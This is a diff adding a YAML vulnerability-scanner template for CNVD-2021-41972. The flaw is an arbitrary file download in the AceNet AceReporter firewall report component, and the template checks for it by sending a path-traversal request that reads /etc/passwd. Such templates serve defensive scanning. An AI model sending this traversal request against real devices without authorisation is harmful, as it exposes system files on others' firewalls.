@@ -1,0 +1,27 @@
+id: CNVD-2021-41972
+brief:
+    title: AceNet AceReporter Report - Arbitrary File Download
+    by: DhiyaneshDk
+    level: high
+    about: All firewall devices that use the AceNet AceReporter report component can download arbitrary files
+    label:
+        - cnvd2021
+        - cnvd
+        - acenet
+        - acereporter
+        - lfi
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/view/action/download_file.php?filename=../../../../../../../../../etc/passwd&savename={{filename}}.txt'
+      signs:
+        - "on": word
+          has:
+            - filename=
+            - application/octet-stream
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
